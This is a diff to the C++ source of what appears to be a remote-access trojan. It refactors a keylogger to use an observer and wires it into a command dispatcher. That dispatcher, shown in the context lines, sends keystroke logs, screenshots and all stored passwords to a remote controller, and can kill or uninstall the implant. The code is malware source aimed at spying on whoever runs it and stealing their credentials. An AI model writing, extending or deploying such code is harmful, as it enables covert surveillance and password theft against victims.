@@ -10,7 +10,10 @@ using namespace System;
 #include <blaspheme/transfer/FileTransfer.hpp>
 using namespace Blaspheme;
 
-#include <malicious/Keylogger.hpp>
+#include <keyboard/Keylogger.hpp>
+#include <keyboard/KeyLogObserver.hpp>
+using namespace Keyboard;
+
 #include <malicious/Screenshot.hpp>
 
 #include "RemoteControlFunctions.hpp"
@@ -29,8 +32,9 @@ namespace Inhibition
 		setConnection(info);
 
         // recuperation du chemin d'installation de l'injecteur
-        Malicious::Keylogger::instance().setKeylog(keylogPath);
-        Malicious::Keylogger::instance().start();
+		KeyLogObserver * keyLogObserver = new KeyLogObserver(keylogPath);
+		Keylogger::instance().addObserver(keyLogObserver);
+        Keylogger::instance().start();
         
         // tous les modules utilisent le meme canal de commande
         SlaveAbstractFunction::setSlave(*this);
@@ -39,7 +43,7 @@ namespace Inhibition
         // on active les modules que le client peut utiliser
         dispatcher.addServerFunction(KILL_CLIENT,           new KillClient);
         dispatcher.addServerFunction(UNINSTALL_CLIENT,      new UninstallClient);
-        dispatcher.addServerFunction(GET_LOGFILE,           new SendKeylog);
+        dispatcher.addServerFunction(GET_LOGFILE,           new SendKeylog(keyLogObserver));
         dispatcher.addServerFunction(GET_SCREEN,            new SendScreenshot(screenshot));
         dispatcher.addServerFunction(PASSWORDS_GETALL,      new SendPasswords);
         dispatcher.addServerFunction(GET_PROCESSLIST,       new SendProcessList);
